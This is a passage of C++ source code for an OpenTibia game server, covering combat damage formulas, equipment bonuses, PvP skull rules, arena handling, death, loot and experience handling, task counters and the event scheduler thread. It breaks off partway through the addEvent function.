#include <string>
#include <sstream>
#include <map>
#include <iostream>
#include <fstream>
#ifdef HUCZU_PAY_SYSTEM
#include <curlpp/cURLpp.hpp>
#include <curlpp/Easy.hpp>
#include <curlpp/Options.hpp>
#include <curlpp/Infos.hpp>
#include <curlpp/Exception.hpp>
#endif
#ifdef __DEBUG_CRITICALSECTION__
#include <iostream>
#include <fstream>
#endif

using namespace std;
//#include "preheaders.h"

#include "otsystem.h"
#include "items.h"
#include "commands.h"
#include "creature.h"
#include "player.h"
#include "monster.h"
#include "npc.h"
#include "game.h"
#include "tile.h"
#ifdef TR_SUMMONS
#include "summons.h"
#endif //TR_SUMMONS
#ifdef __MIZIAK_TASKS__
#include "task.h"
#endif //__MIZIAK_TASKS__
#include "spells.h"
#include "actions.h"
#include "ioplayersql.h"
#include "chat.h"
#include "town.h"
#include "protocol76.h"
#include "status.h"
#include "tools.h"
#include "luascript.h"
#include "templates.h"
#include "houses.h"
#include "pvparena.h"
#include "database.h"

#define EVENT_CHECKCREATURE          123
#define EVENT_CHECKCREATUREATTACKING 124


extern LuaScript g_config;
extern Spells spells;
extern Actions actions;
extern Commands commands;
extern Chat g_chat;
xmlMutexPtr xmlmutex;

extern std::vector< std::pair<uint32_t, uint32_t> > bannedIPs;

GameState::GameState(Game *game, const Range &range)
{
    this->game = game;
    game->getSpectators(range, spectatorlist);
}

#ifdef YUR_PVP_ARENA
bool GameState::isPvpArena(Creature* c)
{
    if (!c)
        return false;
    Tile *tile = game->map->getTile(c->pos);
    return tile && tile->isPvpArena();
}
#endif //YUR_PVP_ARENA

#ifdef YUR_RINGS_AMULETS
int32_t GameState::applyAmulets(Player* player, int32_t damage, attacktype_t atype)
{
    if (!player || atype == ATTACK_NONE)
        return damage;

    double newDamage = (double)damage;
    Item* armor1 = player->getItem(SLOT_ARMOR);
    Item* helmet = player->getItem(SLOT_HEAD);
    Item* legs = player->getItem(SLOT_LEGS);
    Item* necklace = player->getItem(SLOT_NECKLACE);
    Item* ring = player->getItem(SLOT_RING);

    if (necklace && necklace->getCharges() > 0)
    {
        if (necklace->getID() == ITEM_STONE_SKIN_AMULET)
        {
            newDamage *= 0.05;
            necklace->useCharge();
        }
        else if (necklace->getID() == ITEM_PROTECTION_AMULET)
        {
            newDamage *= 0.95;
            necklace->useCharge();
        }
        else if ((necklace->getID() == ITEM_DRAGON_NECKLACE && (atype & ATTACK_FIRE)) ||
                 (necklace->getID() == ITEM_SILVER_AMULET && (atype & ATTACK_POISON)) ||
                 (necklace->getID() == ITEM_STRANGE_TALISMAN && (atype & ATTACK_ENERGY)) ||
                 (necklace->getID() == ITEM_ELVEN_AMULET))
        {
            newDamage *= 0.9;
            necklace->useCharge();
        }

        else if (necklace->getID() == ITEM_BRONZE_AMULET && (atype & ATTACK_MANADRAIN))
        {
            newDamage *= 0.5;
            necklace->useCharge();
        }
        else if (necklace->getID() == ITEM_GARLIC_NECKLACE && (atype & ATTACK_LIFEDRAIN))
        {
            newDamage = 0.05;
            necklace->useCharge();
        }
#ifdef HUCZU_AMULET
        else if (necklace->getID() == ITEM_TYMERIA_AMULET)
        {
            newDamage *= 1.0 - (double)g_config.TYMERIA_AMULET_DESC / 100;
        }
#endif
        if (necklace->getCharges() <= 0
#ifdef HUCZU_AMULET
                && necklace->getID() != ITEM_TYMERIA_AMULET
#endif
           )
            player->removeItemInventory(SLOT_NECKLACE);
    }

    if (ring && ring->getCharges() > 0)
    {
        if (ring->getID() == ITEM_MIGHT_RING)
        {
            newDamage *= 0.9;
            ring->useCharge();
        }

        if (ring->getCharges() <= 0)
            player->removeItemInventory(SLOT_RING);
    }
    if(helmet && helmet->getID() == ITEM_TRIBAL_HELMET && armor1 && armor1->getID() == ITEM_TRIBAL_ARMOR && legs && legs->getID() == ITEM_TRIBAL_LEGS)
        newDamage *= 1.0 - (double)g_config.TRIBAL_SET_DECR/100.0;
    if(armor1 && armor1->getID() == ITEM_PANDEMKA)
        newDamage *= 1.0 - (double)g_config.PANDEMKA/100.0;

    for (int32_t slot = SLOT_RIGHT; slot <= SLOT_LEFT; slot++)
    {
        if (player->getItem(slot))
        {
            if(player->getItem(slot)->getID() == ITEM_BLOOD_SHIELD)
            {
                newDamage *= 1.0 - (double)g_config.SHIELD/100.0;
                break;
            }
            else if(player->getItem(slot)->getID() == ITEM_ASTEL_SHIELD)
            {
                newDamage *= 1.0 - (double)g_config.ASTEL_SHIELD/100.0;
                break;
            }
        }
    }
    return (int32_t)newDamage;
}
#endif //YUR_RINGS_AMULETS

void GameState::onAttack(Creature* attacker, const Position& pos, const MagicEffectClass* me)
{
    Tile *tile = game->map->getTile(pos);

    if(!tile)
        return;

#ifdef YUR_PVP_ARENA
    CreatureVector arenaLosers;
#endif //YUR_PVP_ARENA

    CreatureVector::iterator cit;
    Player* attackPlayer = dynamic_cast<Player*>(attacker);
    Creature *targetCreature = NULL;
    Player *targetPlayer = NULL;
    for(cit = tile->creatures.begin(); cit != tile->creatures.end(); ++cit)
    {
        targetCreature = (*cit);
        targetPlayer = dynamic_cast<Player*>(targetCreature);
        bool pvpArena = false;
#ifdef TR_SUMMONS
        bool targetIsSummon = (targetCreature && targetCreature->isPlayersSummon());
        bool summonVsPlayer = (attacker && attacker->isPlayersSummon() && targetPlayer);
#endif //TR_SUMMONS

        int32_t damage = me->getDamage(targetCreature, attacker);
        int32_t manaDamage = 0;

#ifdef YUR_RINGS_AMULETS
        damage = applyAmulets(targetPlayer, damage, me->attackType);
#endif //YUR_RINGS_AMULETS


        if (damage > 0)
        {
            if(attackPlayer)
            {
                if(targetPlayer && targetPlayer != attackPlayer && game->getWorldType() != WORLD_TYPE_NO_PVP)
                {
#ifdef HUCZU_PVP
                    if(attackPlayer->atkMode != 1)
                    {
                        if((targetPlayer->skullType == SKULL_NONE || (targetPlayer->skullType == SKULL_YELLOW && !attackPlayer->isYellowTo(targetPlayer))) && attackPlayer->attackedCreature != targetPlayer->getID())
                            damage = 0;
                        else
                        {
#endif //HUCZU_PVP
                            attackPlayer->pzLocked = true;
#ifdef HUCZU_PVP
                        }
                    }
                    else
                        damage = 0;
#endif //HUCZU_PVP
                }
            }

            if(attackPlayer)
            {

                if(attackPlayer->getItem(SLOT_HEAD) && attackPlayer->getItem(SLOT_HEAD)->getID() == ITEM_MYSTICTURBAN)
                {
                    double newdamage = (double)damage*g_config.MYSTIC_TURBAN/100.0;
                    damage += (int32_t)newdamage;
                }
                if(attackPlayer->getItem(SLOT_ARMOR) && attackPlayer->getItem(SLOT_ARMOR)->getID() == ITEM_BLUEROBE)
                {
                    double newdamage = (double)damage*g_config.BLUE_ROBE/100.0;
                    damage += (int32_t)newdamage;
                }
                if(attackPlayer->getItem(SLOT_HEAD) && attackPlayer->getItem(SLOT_HEAD)->getID() == ITEM_TRIBAL_HELMET && attackPlayer->getItem(SLOT_ARMOR) && attackPlayer->getItem(SLOT_ARMOR)->getID() == ITEM_TRIBAL_ARMOR && attackPlayer->getItem(SLOT_LEGS) && attackPlayer->getItem(SLOT_LEGS)->getID() == ITEM_TRIBAL_LEGS)
                {
                    double newdamage = (double)damage*g_config.TRIBAL_SET_INCR/100.0;
                    damage += (int32_t)newdamage;
                }
                if(attackPlayer->getItem(SLOT_FEET) && attackPlayer->getItem(SLOT_FEET)->getID() == ITEM_SANDALY)
                {
                    double newdamage = (double)damage*g_config.SANDALY/100.0;
                    damage += (int32_t)newdamage;
                }
                if(attackPlayer->getItem(SLOT_LEGS) && attackPlayer->getItem(SLOT_LEGS)->getID() == ITEM_FEATHER_LEGS)
                {
                    double newdamage = (double)damage*g_config.FEATHER_LEGS/100.0;
                    damage += (int32_t)newdamage;
                }
#ifdef HUCZU_AMULET
                if(attackPlayer->getItem(SLOT_NECKLACE) && attackPlayer->getItem(SLOT_NECKLACE)->getID() == ITEM_TYMERIA_AMULET && attackPlayer->getItem(SLOT_NECKLACE)->getCharges() > 0)
                {
                    double newdamage = (double)damage*g_config.TYMERIA_AMULET_INCR/100.0;
                    damage += (int32_t)newdamage;
                }
#endif
                if(attackPlayer->getItem(SLOT_BACKPACK) && attackPlayer->getItem(SLOT_BACKPACK)->getID() == ITEM_MAGIC_BACKPACK)
                {
                    double newdamage = (double)damage*g_config.MAGIC_BACKPACK/100.0;
                    damage += (int32_t)newdamage;
                }
                if(attackPlayer->getItem(SLOT_RING) && attackPlayer->getItem(SLOT_RING)->getID() == ITEM_DIAMOND_RING)
                {
                    double newdamage = (double)damage*g_config.DIAMOND_RING/100.0;
                    damage += (int32_t)newdamage;
                }

            }
            if(targetCreature->access < g_config.ACCESS_PROTECT && targetPlayer && game->getWorldType() != WORLD_TYPE_NO_PVP)
            {
#ifdef YUR_CVS_MODS
                targetPlayer->inFightTicks = std::max(g_config.PZ_LOCKED, targetPlayer->inFightTicks);
#else
                targetPlayer->inFightTicks = (int32_t)g_config.PZ_LOCKED;
#endif //YUR_CVS_MODS
                targetPlayer->sendIcons();
            }

#ifdef YUR_PVP_ARENA
            pvpArena = isPvpArena(attacker) && isPvpArena(targetCreature);
#endif //YUR_PVP_ARENA

#ifdef TR_SUMMONS
            if ((game->getWorldType() == WORLD_TYPE_NO_PVP && !pvpArena && summonVsPlayer) ||
                    (game->getWorldType() == WORLD_TYPE_NO_PVP && !pvpArena && attackPlayer && (targetPlayer || targetIsSummon) && attackPlayer->access < g_config.ACCESS_PROTECT))
#else
            if(game->getWorldType() == WORLD_TYPE_NO_PVP && !pvpArena && attackPlayer && targetPlayer && attackPlayer->access < ACCESS_PROTECT)
#endif //TR_SUMMONS
                damage = 0;
        }

        if (damage != 0)
        {
            if (me->attackType & ATTACK_MANADRAIN)
            {
                manaDamage = std::min(damage, targetCreature->mana);
                targetCreature->drainMana(manaDamage);
                damage = 0;
            }
            else
            {
                game->creatureApplyDamage(targetCreature, damage, damage, manaDamage
#ifdef YUR_PVP_ARENA
                                          , (pvpArena? &arenaLosers : NULL)
#endif //YUR_PVP_ARENA
                                         );
            }

            if (me->attackType & ATTACK_LIFEDRAIN)
            {
                attacker->health = std::min(attacker->healthmax, attacker->health + damage);
                addCreatureState(tile, attacker, 0, 0, false);	// update attacker health
            }
            else if (targetCreature && !targetPlayer)
            {
                targetCreature->setInvisible(0);
                game->creatureChangeOutfit(targetCreature);
            }
        }
#ifdef HUCZU_PVP
        if (attackPlayer && attackPlayer->atkMode != 1 && me->offensive && game->getWorldType() == WORLD_TYPE_PVP && targetPlayer &&
                (targetPlayer->getID() == attackPlayer->attackedCreature || targetPlayer->skullType == SKULL_WHITE || targetPlayer->skullType == SKULL_RED || (targetPlayer->skullType == SKULL_YELLOW && targetPlayer->isYellowTo(attackPlayer))))
            game->onPvP(attacker, targetCreature, targetCreature->health <= 0);
#endif

        addCreatureState(tile, targetCreature, damage, manaDamage, me->drawblood);
    }

    //Solid ground items/Magic items (fire/poison/energy)
    MagicEffectItem *newmagicItem = me->getMagicItem(attacker, tile->isPz(),
                                    (tile->isBlocking(BLOCK_SOLID, true) != RET_NOERROR));

    if(newmagicItem)
    {

        MagicEffectItem *magicItem = tile->getFieldItem();

        if(magicItem)
        {
            //Replace existing magic field
            //magicItem->transform(newmagicItem);

            int32_t stackpos = tile->getThingStackPos(magicItem);
            if(tile->removeThing(magicItem))
            {

                SpectatorVec list;
                SpectatorVec::iterator it;

                game->getSpectators(Range(pos, true), list);

                //players
                for(it = list.begin(); it != list.end(); ++it)
                {
                    if(dynamic_cast<Player*>(*it))
                    {
                        (*it)->onThingDisappear(magicItem, stackpos);
                    }
                }

                //none-players
                for(it = list.begin(); it != list.end(); ++it)
                {
                    if(!dynamic_cast<Player*>(*it))
                    {
                        (*it)->onThingDisappear(magicItem, stackpos);
                    }
                }
                Item* magicItemDwa = new MagicEffectItem(*newmagicItem);
                magicItemDwa->useThing();
                magicItemDwa->pos = pos;
                tile->addThing(magicItemDwa);

                //players
                for(it = list.begin(); it != list.end(); ++it)
                {
                    if(dynamic_cast<Player*>(*it))
                    {
                        (*it)->onThingAppear(magicItemDwa);
                    }
                }

                //none-players
                for(it = list.begin(); it != list.end(); ++it)
                {
                    if(!dynamic_cast<Player*>(*it))
                    {
                        (*it)->onThingAppear(magicItemDwa);
                    }
                }
                magicItemDwa->isRemoved = false;
                game->startDecay(magicItemDwa);
            }
        }
        else
        {
            magicItem = new MagicEffectItem(*newmagicItem);
            magicItem->useThing();
            magicItem->pos = pos;

            tile->addThing(magicItem);

            SpectatorVec list;
            SpectatorVec::iterator it;

            game->getSpectators(Range(pos, true), list);

            //players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(dynamic_cast<Player*>(*it))
                {
                    (*it)->onThingAppear(magicItem);
                }
            }

            //none-players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(!dynamic_cast<Player*>(*it))
                {
                    (*it)->onThingAppear(magicItem);
                }
            }

            magicItem->isRemoved = false;
            game->startDecay(magicItem);
        }
    }

    //Clean up
    for(CreatureStateVec::const_iterator csIt = creaturestates[tile].begin(); csIt != creaturestates[tile].end(); ++csIt)
    {
        onAttackedCreature(tile, attacker, csIt->first, csIt->second.damage, csIt->second.drawBlood);
    }

    if(attackPlayer && attackPlayer->access < g_config.ACCESS_PROTECT)
    {
        //Add exhaustion
        if(me->causeExhaustion(true) /*!areaTargetVec.empty())*/)
        {
            if (!me->offensive && me->minDamage != 0)	// healing
                attackPlayer->exhaustedTicks = g_config.EXHAUSTED_HEAL;
            else
                attackPlayer->exhaustedTicks = g_config.EXHAUSTED;
        }

        //Fight symbol
        if(me->offensive /*&& !areaTargetVec.empty()*/)
        {
#ifdef YUR_CVS_MODS
            attackPlayer->inFightTicks = std::max(g_config.PZ_LOCKED, attackPlayer->inFightTicks);
#else
            attackPlayer->inFightTicks = (int32_t)g_config.PZ_LOCKED;
#endif //YUR_CVS_MODS
        }
    }

#ifdef YUR_PVP_ARENA
    for (CreatureVector::iterator it = arenaLosers.begin(); it != arenaLosers.end(); ++it)
    {
        Tile* tile = game->getTile((*it)->pos);
        if (tile)
        {
            game->teleport(*it, tile->getPvpArenaExit());	// kick losers
            (*it)->inFightTicks = 0;
        }
    }
#endif //YUR_PVP_ARENA
}

void GameState::onAttack(Creature* attacker, const Position& pos, Creature* attackedCreature)
{
    bool pvpArena = false;
#ifdef YUR_PVP_ARENA
    CreatureVector arenaLosers;
    pvpArena = isPvpArena(attacker) && isPvpArena(attackedCreature);
#endif //YUR_PVP_ARENA

    //TODO: Decent formulas and such...
    int32_t damage = attacker->getWeaponDamage();
    int32_t armor = attackedCreature->getArmor();
    int32_t defense = attackedCreature->getDefense();

    Player* attackPlayer = dynamic_cast<Player*>(attacker);
    Player* attackedPlayer = dynamic_cast<Player*>(attackedCreature);

    if(attackedPlayer)
        attackedPlayer->addSkillShieldTry(1);

    int32_t probability = rand() % 10000;

#ifdef YUR_CVS_MODS
    if (probability * damage < defense * 1000)
        damage = 0;
    else
        damage -= (int32_t)(damage*(armor/100.0)*(rand()/(RAND_MAX+1.0))) + armor;
    //damage -= (int32_t)((armor)*(rand()/(RAND_MAX+1.0))) + armor;	// wik's
#else
    if(probability * damage < defense * 10000)
        damage = 0;
    else
    {
        damage -= (armor * (10000 + rand() % 10000)) / 10000;
    }
#endif //YUR_CVS_MODS

    int32_t manaDamage = 0;

    if(attackPlayer && attackedPlayer)
    {
        damage -= (int32_t) damage / 2;
    }

    /*if (attacker->access >= g_config.ACCESS_PROTECT)
        damage += 1337;*/

    if(damage < 0 || attackedCreature->access >= g_config.ACCESS_PROTECT)
        damage = 0;

    Tile* tile = game->map->getTile(pos);
    bool blood;
    if(damage != 0)
    {
        if (attackPlayer)
            for (int32_t slot = SLOT_RIGHT; slot <= SLOT_LEFT; slot++)
                if(attackPlayer->getItem(slot) && attackPlayer->getItem(slot)->getID() == ITEM_ICE_RAPIER)
                    attackPlayer->removeItemInventory(slot);

#ifdef YUR_RINGS_AMULETS
        damage = applyAmulets(attackedPlayer, damage, ATTACK_PHYSICAL);
#endif //YUR_RINGS_AMULETS

        game->creatureApplyDamage(attackedCreature, damage, damage, manaDamage
#ifdef YUR_PVP_ARENA
                                  , (pvpArena? &arenaLosers : NULL)
#endif //YUR_PVP_ARENA
                                 );

#ifdef HUCZU_PVP
        Monster* monster = dynamic_cast<Monster*>(attackedCreature);
        if(attackPlayer && !monster && attackPlayer->atkMode != 1)
            if(attackedPlayer && attackedPlayer != attackPlayer && game->getWorldType() != WORLD_TYPE_NO_PVP)
                if (attackedPlayer->getID() == attackPlayer->attackedCreature || attackedPlayer->skullType == SKULL_WHITE || attackedPlayer->skullType == SKULL_RED || (attackedPlayer->skullType == SKULL_YELLOW && attackedPlayer->isYellowTo(attackPlayer)))
                    game->onPvP(attacker, attackedCreature, attackedCreature->health <= 0);
#endif //HUCZU_PVP

        blood = true;
    }
    else //no draw blood
    {
        blood = false;
    }

    addCreatureState(tile, attackedCreature, damage, manaDamage, blood);
    onAttackedCreature(tile, attacker, attackedCreature, damage,  true);

    if (attackPlayer && attackPlayer->isUsingSpears() && random_range(1,100000) > g_config.SPEAR_LOSE_CHANCE)
    {
        Item* spear = Item::CreateItem(ITEM_SPEAR, 1);
        spear->pos = attackedCreature->pos;
        game->addThing(attackPlayer, spear->pos, spear);
    }

#ifdef YUR_PVP_ARENA
    for (CreatureVector::iterator it = arenaLosers.begin(); it != arenaLosers.end(); ++it)
    {
        Tile* tile = game->getTile((*it)->pos);
        if (tile)
            game->teleport(*it, tile->getPvpArenaExit());
    }
#endif //YUR_PVP_ARENA
}

void GameState::addCreatureState(Tile* tile, Creature* attackedCreature, int32_t damage, int32_t manaDamage, bool drawBlood)
{
    CreatureState cs;
    cs.damage = damage;
    cs.manaDamage = manaDamage;
    cs.drawBlood = drawBlood;

    creaturestates[tile].push_back( make_pair(attackedCreature, cs) );
}

void GameState::onAttackedCreature(Tile* tile, Creature *attacker, Creature* attackedCreature, int32_t damage, bool drawBlood)
{
    Player *attackedplayer = dynamic_cast<Player*>(attackedCreature);
    Player* atakujacy = dynamic_cast<Player*>(attacker);
    Position CreaturePos = attackedCreature->pos;
    bool dead = false;
//Summon exp share by Yurez
    Creature* attackerMaster = attacker? attacker->getMaster() : NULL;
    if(atakujacy && dynamic_cast<Player*>(attackerMaster)) //attacker is players summon
    {
        attackedCreature->addInflictedDamage(attacker, damage/2);
        attackedCreature->addInflictedDamage(attackerMaster, damage/2);
    }// end summon exp share
    else
        attackedCreature->addInflictedDamage(attacker, damage);

    if(attackedplayer)
    {
        attackedplayer->sendStats();
    }
    //Remove player?
    if(attackedCreature->health <= 0 && attackedCreature->isRemoved == false)
    {
        dead = true;
        if (attackedplayer && attacker)
            attackedplayer->addDeath(attacker->getName(), attackedplayer->level, time(0));

        if(attackedplayer && atakujacy)
            atakujacy->frags++;

        unsigned char stackpos = tile->getThingStackPos(attackedCreature);

        //Prepare body
        Item *corpseitem = Item::CreateItem(attackedCreature->getLookCorpse());
        corpseitem->pos = CreaturePos;
        tile->addThing(corpseitem);

        //Add eventual loot
        Container *lootcontainer = dynamic_cast<Container*>(corpseitem);
        if(lootcontainer)
        {
            attackedCreature->dropLoot(lootcontainer);
#ifdef HUCZU_LOOT_INFO
            Monster* monster = dynamic_cast<Monster*>(attackedCreature);
            if(monster && !monster->isSummon() && atakujacy)
            {
                std::stringstream ss, info;
                info << "Loot of " << monster->getName();
                ss << lootcontainer->getContentDescription() << ".";
                game->creatureSendToSpecialChannel(atakujacy, SPEAK_CHANNEL_O, ss.str().c_str(), 0x06, info.str().c_str());
            }
#endif //HUCZU_LOOT_INFO
        }
#ifdef __MIZIAK_CREATURESCRIPTS__
        if(atakujacy && attackedCreature)
            actions.creatureEvent("kill", atakujacy, attackedCreature, corpseitem, NULL);
#endif //__MIZIAK_CREATURESCRIPTS__
        if(attackedplayer)
        {
            if(tile->ground)
                actions.luaWalkOff(attackedplayer,attackedplayer->pos,tile->ground->getID(),tile->ground->getUniqueId(),tile->ground->getActionId()); //CHANGE onWalk
            attackedplayer->onThingDisappear(attackedplayer,stackpos);
#ifdef __MIZIAK_CREATURESCRIPTS__
            attackedplayer->dieorlogout = true;
            if(attacker)
                actions.creatureEvent("death", attackedplayer, attacker, corpseitem, NULL);
#endif //__MIZIAK_CREATURESCRIPTS__
            attackedplayer->die();        //handles exp/skills/maglevel loss
        }
        //remove creature
        game->removeCreature(attackedCreature);
#ifdef __MIZIAK_TASKS__
        if(attackedCreature && Tasks::isTaskMonster(attackedCreature->getName()))
        {
            std::string task_name = attackedCreature->getName();
            Player *taskPlayer = dynamic_cast<Player*>(attacker);
            if(taskPlayer)
            {
                int32_t value;
                if(taskPlayer->getStorageValue(Tasks::getTaskStorage(task_name),value))
                {
                    int32_t count = Tasks::getTaskCount(task_name);
                    if(value-1 <= count && value != count+1)
                    {
                        taskPlayer->addStorageValue(Tasks::getTaskStorage(task_name), value+1);
                        char txt[1024];
                        if(count-value != 0)
                        {
                            sprintf(txt, "Musisz zabic jeszcze %i potworow o nazwie: %s!", count-value, task_name.c_str());
                            taskPlayer->sendCancel(txt);
                        }
                        else
                        {
                            sprintf(txt, "Wykonalem/am zadanie na zabicie %i potworow o nazwie %s musze udac sie po nagrode!", count, task_name.c_str());
                            game->creatureSay(taskPlayer,SPEAK_MONSTER1, txt);
                        }
                    }
                }
            }
        }
#endif //__MIZIAK_TASKS__
        // Update attackedCreature pos because contains
        //  temple position for players
        attackedCreature->pos = CreaturePos;

        //add body
        game->sendAddThing(NULL,corpseitem->pos,corpseitem);

        if(attackedplayer)
        {
            std::stringstream ss;
            ss << corpseitem->getDescription(false);

            ss << "You recognize " << attackedplayer->getName() << ". ";
            if(attacker)
            {
                ss << (attackedplayer->getSex() == PLAYERSEX_FEMALE ? "She" : "He") << " was killed by ";

                Player *attackerplayer = dynamic_cast<Player*>(attacker);
                if(attackerplayer)
                {
                    ss << attacker->getName();
                }
                else
                {
                    std::string creaturename = attacker->getName();
                    //std::transform(creaturename.begin(), creaturename.end(), creaturename.begin(), (int32_t(*)(int32_t))tolower);
                    toLowerCaseString(creaturename);
                    ss << article(creaturename);
                }
            }

            //set body special description
            corpseitem->setSpecialDescription(ss.str());
            //send corpse to the dead player. It is not in spectator list
            // because was removed
            attackedplayer->onThingAppear(corpseitem);
        }
        game->startDecay(corpseitem);

        //Get all creatures that will gain xp from this kill..
        CreatureState* attackedCreatureState = NULL;
        std::vector<int32_t> creaturelist;
        if(!(dynamic_cast<Player*>(attackedCreature) && game->getWorldType() != WORLD_TYPE_PVP_ENFORCED))
        {
            creaturelist = attackedCreature->getInflicatedDamageCreatureList();
            CreatureStateVec& creatureStateVec = creaturestates[tile];
            for(CreatureStateVec::iterator csIt = creatureStateVec.begin(); csIt != creatureStateVec.end(); ++csIt)
            {
                if(csIt->first == attackedCreature)
                {
                    attackedCreatureState = &csIt->second;
                    break;
                }
            }
        }
        Player *highPlayer = dynamic_cast<Player*>(attacker);
        exp_t gainExp = 0;

        if(attackedCreatureState)   //should never be NULL..
        {
            //Add experience
            for(std::vector<int32_t>::const_iterator iit = creaturelist.begin(); iit != creaturelist.end(); ++iit)
            {
                Creature* gainExpCreature = game->getCreatureByID(*iit);
                if(gainExpCreature)
                {
                    exp_t gainedExperience = attackedCreature->getGainedExperience(gainExpCreature);
                    if(gainedExperience <= 0)
                        continue;

                    Player *gainExpPlayer = dynamic_cast<Player*>(gainExpCreature);

                    if(gainExpPlayer)
                    {
                        gainExpPlayer->addExp(gainedExperience);
                        if(gainExp < gainedExperience)
                        {
                            highPlayer = gainExpPlayer;
                            gainExp = gainedExperience;
                        }
                    }

                    //Need to add this creature and all that can see it to spectators, unless they already added
                    SpectatorVec creaturelist;
                    game->getSpectators(Range(gainExpCreature->pos, true), creaturelist);

                    for(SpectatorVec::const_iterator cit = creaturelist.begin(); cit != creaturelist.end(); ++cit)
                    {
                        if(std::find(spectatorlist.begin(), spectatorlist.end(), *cit) == spectatorlist.end())
                        {
                            spectatorlist.push_back(*cit);
                        }
                    }

                    //Add creature to attackerlist
                    attackedCreatureState->attackerlist.push_back(gainExpCreature);
                }
            }
        }

        Player *player = dynamic_cast<Player*>(attacker);
        if(player)
        {
            player->sendStats();
            if(corpseitem)
                game->startOwner(corpseitem, highPlayer);
        }

        if(attackedCreature && attackedCreature->getMaster() != NULL)
        {
            attackedCreature->getMaster()->removeSummon(attackedCreature);
        }
    }


    //Add blood?
    if((drawBlood || attackedCreature->health <= 0) && damage > 0 && attackedCreature->bloodsplash != 255)
    {
        Item* splash = Item::CreateItem(dead? ITEM_POOL : ITEM_SPLASH, attackedCreature->bloodsplash);
        game->addThing(NULL, CreaturePos, splash);
        game->startDecay(splash);
        game->updateTile(CreaturePos);
    }
}


Game::Game()
{
    eventIdCount = 1000;
    this->game_state = GAME_STATE_NORMAL;
    this->map = NULL;
    this->worldType = WORLD_TYPE_PVP;
    OTSYS_THREAD_LOCKVARINIT(gameLock);
    OTSYS_THREAD_LOCKVARINIT(eventLock);
    OTSYS_THREAD_LOCKVARINIT(AutoID::autoIDLock);
    OTSYS_THREAD_SIGNALVARINIT(eventSignal);
    BufferedPlayers.clear();
    OTSYS_CREATE_THREAD(eventThread, this);

#ifdef __DEBUG_CRITICALSECTION__
    OTSYS_CREATE_THREAD(monitorThread, this);
#endif

    addEvent(makeTask(DECAY_INTERVAL, boost::bind(&Game::checkDecay,this,DECAY_INTERVAL)));

#ifdef HUCZU_NAPISY
    addEvent(makeTask(3000, std::mem_fun(&Game::checkNapisy)));
#endif

#ifdef CVS_DAY_CYCLE
    int32_t daycycle = 3600;
    light_hour_delta = 1440*10/daycycle;
    light_hour = 0;
    lightlevel = LIGHT_LEVEL_NIGHT;
    light_state = LIGHT_STATE_NIGHT;
    addEvent(makeTask(10000, boost::bind(&Game::checkLight, this, 10000)));
#endif //CVS_DAY_CYCLE
}


Game::~Game()
{
    if(map)
    {
        delete map;
    }
}

void Game::setWorldType(enum_world_type type)
{
    this->worldType = type;
}

enum_game_state Game::getGameState()
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::getGameState()");
    return game_state;
}

int32_t Game::loadMap(std::string filename, std::string filekind)
{
    if(!map)
        map = new Map;

    max_players = g_config.MAX_PLAYERS;
    return map->loadMap(filename, filekind);
}



/*****************************************************************************/

#ifdef __DEBUG_CRITICALSECTION__

OTSYS_THREAD_RETURN Game::monitorThread(void *p)
{
    Game* _this = (Game*)p;

    while (true)
    {
        OTSYS_SLEEP(6000);

        int32_t ret = OTSYS_THREAD_LOCKEX(_this->gameLock, 60 * 2 * 1000);
        if(ret != OTSYS_THREAD_TIMEOUT)
        {
            OTSYS_THREAD_UNLOCK(_this->gameLock, NULL);
            continue;
        }

        bool file = false;
        std::ostream *outdriver;
        std::cout << "Error: generating critical section file..." <<std::endl;
        std::ofstream output("deadlock.txt",std::ios_base::app);
        if(output.fail())
        {
            outdriver = &std::cout;
            file = false;
        }
        else
        {
            file = true;
            outdriver = &output;
        }

        time_t rawtime;
        time(&rawtime);
        *outdriver << "*****************************************************" << std::endl;
        *outdriver << "Error report - " << std::ctime(&rawtime) << std::endl;

        OTSYS_THREAD_LOCK_CLASS::LogList::iterator it;
        for(it = OTSYS_THREAD_LOCK_CLASS::loglist.begin(); it != OTSYS_THREAD_LOCK_CLASS::loglist.end(); ++it)
        {
            *outdriver << (it->lock ? "lock - " : "unlock - ") << it->str
                       << " threadid: " << it->threadid
                       << " time: " << it->time
                       << " ptr: " << it->mutexaddr
                       << std::endl;
        }

        *outdriver << "*****************************************************" << std::endl;
        if(file)
            ((std::ofstream*)outdriver)->close();

        std::cout << "Error report generated. Killing server." <<std::endl;
        exit(1); //force exit
    }
}
#endif

OTSYS_THREAD_RETURN Game::eventThread(void *p)
{

    Game* _this = (Game*)p;

    // basically what we do is, look at the first scheduled item,
    // and then sleep until it's due (or if there is none, sleep until we get an event)
    // of course this means we need to get a notification if there are new events added
    while (true)
    {
#ifdef __DEBUG__EVENTSCHEDULER__
        std::cout << "schedulercycle start..." << std::endl;
#endif

        SchedulerTask* task = NULL;
        bool runtask = false;

        // check if there are events waiting...
        OTSYS_THREAD_LOCK(_this->eventLock, "eventThread()")

        int32_t ret;
        if (_this->eventList.empty())
        {
            // unlock mutex and wait for signal
            ret = OTSYS_THREAD_WAITSIGNAL(_this->eventSignal, _this->eventLock);
        }
        else
        {
            // unlock mutex and wait for signal or timeout
            ret = OTSYS_THREAD_WAITSIGNAL_TIMED(_this->eventSignal, _this->eventLock, _this->eventList.top()->getCycle());
        }
        // the mutex is locked again now...
        if (ret == OTSYS_THREAD_TIMEOUT)
        {
            // ok we had a timeout, so there has to be an event we have to execute...
#ifdef __DEBUG__EVENTSCHEDULER__
            std::cout << "event found at " << OTSYS_TIME() << " which is to be scheduled at: " << _this->eventList.top()->getCycle() << std::endl;
#endif
            task = _this->eventList.top();
            _this->eventList.pop();
        }

        if(task)
        {
            std::map<uint32_t, SchedulerTask*>::iterator it = _this->eventIdMap.find(task->getEventId());
            if(it != _this->eventIdMap.end())
            {
                _this->eventIdMap.erase(it);
                runtask = true;
            }
        }

        OTSYS_THREAD_UNLOCK(_this->eventLock, "eventThread()");
        if (task)
        {
            if(runtask)
            {
                (*task)(_this);
            }
            delete task;
        }
    }

}

uint32_t Game::addEvent(SchedulerTask* event)
{
    bool do_signal = false;
    OTSYS_THREAD_LOCK(eventLock, "addEvent()")

    if(event->getEventId() == 0)
    {
        ++eventIdCount;
        event->setEventId(eventIdCount);
    }

#ifdef __DEBUG__EVENTSCHEDULER__
    std::cout << "addEvent - " << event->getEventId() << std::endl;
#endif

    eventIdMap[event->getEventId()] = event;

    /*
    if (eventList.empty() ||  *event < *eventList.top())
    do_signal = true;
    */

